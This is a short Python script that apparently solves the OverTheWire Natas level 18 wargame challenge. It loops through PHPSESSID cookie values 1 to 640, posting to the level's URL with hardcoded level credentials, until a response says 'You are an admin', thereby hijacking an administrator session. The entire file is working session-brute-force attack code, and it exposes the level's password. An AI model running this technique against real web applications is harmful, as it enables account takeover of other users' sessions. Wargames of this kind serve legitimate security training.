import requests         

url="http://natas18.natas.labs.overthewire.org"
auth=("natas18","6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")
data={
    "username":"username",
    "password":"password"
}
params={
    "debug":1
}
cookies={
    "PHPSESSID":"1"
}


for i in range(1,641):
    print(i)
    cookies["PHPSESSID"]=str(i)
    response=requests.post(
        url,
        auth=auth,
        data=data,
        params=params,
        cookies=cookies
    )

    if "You are an admin" in response.text:
        print(f"i: {i}\n{response.text}\n")
        break

print("done")


